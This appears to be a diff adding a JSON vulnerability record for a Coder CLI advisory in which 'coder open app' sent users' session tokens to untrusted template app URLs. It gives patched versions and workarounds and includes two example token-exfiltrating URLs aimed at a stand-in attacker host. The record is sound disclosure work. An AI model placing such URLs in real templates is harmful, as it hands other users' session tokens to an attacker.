@@ -1,0 +1,71 @@
+{
+  "id": "GHSA-6g9g-vmp7-r45p",
+  "aliases": [],
+  "title": "coder open app sends the session token to untrusted template app URLs",
+  "summary": "### Summary\r\n\r\n`coder open app` replaced `$SESSION_TOKEN` in an external app's URL with the user's real session token whenever the app was defined in the template, wherever the URL pointed. A template author could use this to collect the session token of any user who opened the app from the CLI. The dashboard refused to do this, so the CLI and the dashboard handled the same app differently.\r\n\r\n### Details\r\n\r\nThe fix for CVE-2026-55431 (GHSA-v54h-cp2w-9x4g) stopped the CLI from adding the session token to external apps registered from inside a workspace. Apps defined in the template were still treated as trusted, and the CLI added the token with no check on the URL's scheme or destination.\r\n\r\nA template author could set an external app's URL to `https://attacker.example/?t=$SESSION_TOKEN`, or to an IDE link that points at another server, such as `vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN`. When a user ran `coder open app` on that app, the CLI added their token and opened the URL.\r\n\r\nThe dashboard has never added the token to an `http` or `https` URL. It started rejecting IDE links that point at another server in GHSA-2x8w-q434-f76p, so on releases older than that fix the dashboard was affected by the IDE-link case too.\r\n\r\nThe fix applies the dashboard's rule to the CLI. The CLI now adds the session token only when the link opens a known Coder IDE handler, its `url` parameter is this deployment with no path, and the placeholder is the whole value of its `token` parameter. Any other link with the placeholder is printed with a warning and not opened.\r\n\r\n### Impact\r\n\r\nA template author already receives the workspace owner's token when the workspace is built. What this adds is the token of any other user who opens the app from the CLI, such as a user the workspace is shared with or an administrator helping with the workspace. The attacker can then act as that user, with that user's permissions, until the token expires.\r\n\r\nThe victim has to run `coder open app` on the app. Opening the same app from the dashboard was not affected, on releases that include the dashboard fix from GHSA-2x8w-q434-f76p.\r\n\r\nThis is rated Medium, lower than GHSA-v54h-cp2w-9x4g, because only a template author can set up the attack. In GHSA-v54h-cp2w-9x4g, any code running inside a workspace could register the malicious app. Template authors are a trusted role: they already control what runs in every workspace built from their templates and already receive the workspace owner's token.\r\n\r\n### Patches\r\n\r\n| Release line | Fixed version |\r\n|---|---|\r\n| 2.39 (mainline) | v2.39.1 |\r\n| 2.38 (stable) | v2.38.7 |\r\n| 2.37 (security support) | v2.37.11 |\r\n| 2.34 (ESR) | v2.34.19 |\r\n| 2.29 (ESR) | v2.29.27 |\r\n\r\nTemplates whose external apps don't meet the dashboard's rule will stop receiving a token from `coder open app`, as they already do in the dashboard. The link must open a Coder IDE handler, its `url` parameter must be this deployment with no path, and the placeholder must be the whole value of its `token` parameter.\r\n\r\n### Workarounds\r\n\r\nOn releases that include the dashboard fix from GHSA-2x8w-q434-f76p, open external apps from the dashboard rather than with `coder open app`. Template administrators can review external app URLs that contain `$SESSION_TOKEN` and limit who can create or edit templates.\r\n\r\n### References\r\n\r\n- https://github.com/coder/coder/pull/31721\r\n- GHSA-v54h-cp2w-9x4g\r\n- GHSA-2x8w-q434-f76p\r\n\r\n### Credits\r\n\r\nWe'd like to thank @manus-use, Anthropic's Security Team (ANT-2026-3ZZB56HZ) and Adam Korczynski of [Ada Logics](https://adalogics.com/), who reported and validated this issue, and our internal security team, who identified it independently.",
+  "published_at": "2026-11-11T10:37:39.000Z",
+  "modified_at": "2026-11-11T10:37:39.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 6.1,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-200",
+    "CWE-522"
+  ],
+  "affected": [
+    {
+      "product": "coder",
+      "ranges": [
+        {
+          "introduced": "2.39.0",
+          "fixed": "2.39.1"
+        },
+        {
+          "introduced": "2.38.0",
+          "fixed": "2.38.7"
+        },
+        {
+          "introduced": "2.37.0",
+          "fixed": "2.37.11"
+        },
+        {
+          "introduced": "2.30.0",
+          "fixed": "2.34.19"
+        },
+        {
+          "introduced": "2.0.0",
+          "fixed": "2.29.27"
+        },
+        {
+          "introduced": "2.35.0",
+          "fixed": "2.37.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/coder/coder/security/advisories/GHSA-6g9g-vmp7-r45p",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-6g9g-vmp7-r45p",
+      "url": "https://github.com/coder/coder/security/advisories/GHSA-6g9g-vmp7-r45p",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:af8a64e8cd346eefd2289b82b239d95685f8b9528b9bef84721be31ba76acafc",
+  "note": null
+}
